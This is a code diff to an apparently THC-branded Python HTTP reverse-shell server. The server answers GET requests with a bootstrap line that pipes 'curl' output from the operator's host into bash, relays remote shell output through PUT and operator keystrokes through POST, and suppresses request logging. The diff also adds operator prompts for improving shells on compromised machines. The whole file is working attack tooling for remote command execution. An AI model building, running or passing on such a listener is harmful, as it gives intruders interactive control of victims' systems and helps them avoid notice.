@@ -89,24 +89,28 @@ def locker(c, d, should_exit):
                 v = lockdata[k]
                 s += v
             if s <= 0:
-                eprint("Exiting")
                 os._exit(0)
     finally:
         lock.release()
 
 class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
 
+    # Suppress logging
+    def log_message(*args):
+        pass
+
     # this is receiving the output of the bash process on the remote end and prints it to the local terminal
     def do_PUT(self):
         self.server.should_exit = False
-        w = self.path[1:]        
-        d = getattr(sys, w)
+        d = getattr(sys, "stdout")
         if not d:
             raise Exception("Invalid request")
-        locker(w, 1, not self.server.args.serve_forever)
-        eprint(w, "stream connected")
-        eprint('\x1b[0;35mTHC says: pimp up your prompt: Cut & Paste the following into your remote shell:\x1b[0m')
-        eprint('\x1b[0;36mcommand -v script >/dev/null && exec script -qc "/usr/bin/env bash -il" /dev/null\x1b[0m')
+        locker("stdout", 1, not self.server.args.serve_forever)
+        eprint("\x1b[1;32mReverse shell connected.\x1b[0m")
+        eprint('\x1b[0;35mTHC says: pimp up your prompt: Cut & Paste the following:\x1b[0m')
+        # Fix if SHELL=/usr/sbin/nologin or /bin/false or /bin/false or "" or invalid shell:
+        eprint('\x1b[0;36mSHELL=$(${SHELL:-false} -c "echo $SHELL") || unset SHELL;  SHELL=${SHELL:-$(bash -c "echo bash" || ash -c "echo ash")}\x1b[0m')
+        eprint('\x1b[0;36mcommand -v script >/dev/null && ${SHELL:-bash} -c : && exec script -qc "/usr/bin/env ${SHELL:-bash} -il" /dev/null\x1b[0m')
         eprint('\x1b[0;36mexport TERM=xterm-256color\x1b[0m')
         eprint("\x1b[0;36mPS1='{THC} \[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w \[\\e[0;31m\]\\$\[\\e[m\] '\x1b[0m")
         eprint("\x1b[0;36mreset\x1b[0m")
@@ -121,13 +125,14 @@ class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
             d.buffer.flush()
             # chunk trailer
             sr.readline()
-        eprint(w, "stream closed")
+        # eprint(w, "stream closed")
+        eprint("--> \x1b[1;37mJoin us on Telegram - https://t.me/thcorg\x1b[0m")
         self.server.should_exit = True
-        locker(w, -1, not self.server.args.serve_forever)
+        locker("stdout", -1, not self.server.args.serve_forever)
 
     # this is feeding the bash process on the remote end with input typed in the local terminal
     def do_POST(self):
-        eprint("stdin stream connected")
+        # eprint("stdin stream connected")
         self.send_response(200)
         self.send_header('Content-Type', "application/binary")
         self.send_header('Transfer-Encoding', 'chunked')
@@ -150,12 +155,12 @@ class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
                 else:
                     self._send_chunk(line)
         self._send_chunk("")
-        eprint("stdin stream closed")
+        # eprint("stdin stream closed")
         
         locker("stdin", -1, not self.server.args.serve_forever)
         
     def do_GET(self):
-        eprint("cmd request received from", self.headers.get('X-Forwarded-For') or self.client_address)
+        eprint("Request received from", self.headers.get('X-Forwarded-For') or self.client_address)
         schema = self.headers['X-Forwarded-Proto']
         if not schema:
             schema = "https" if self.server.args.certificate else "http"
@@ -163,7 +168,7 @@ class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
         if self.server.args.x:
             proxy = "-x " + self.server.args.x
         # Note: ash/busybox's 'sh -il' will fail with SIGTTIN if not connected to a PTY.
-        shell = self.server.args.shell or "{ command -v bash >/dev/null && { /usr/bin/env bash -il; true;} || /usr/bin/env sh;}"
+        shell = self.server.args.shell or "{ command -v bash >/dev/null && exec /usr/bin/env bash -il || exec /usr/bin/env sh;}"
         host = self.headers["Host"]
         cmd = f"exec curl {proxy} -X POST -sNk {schema}://{host}/input"
         cmd+= f" | {shell} 2>&1"
@@ -176,7 +181,7 @@ class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self._send_chunk(cmd)
         self._send_chunk("")
-        eprint("bootstrapping command sent")
+        # eprint("bootstrapping command sent")
 
     def _send_chunk(self, data):
         if type(data) == str:
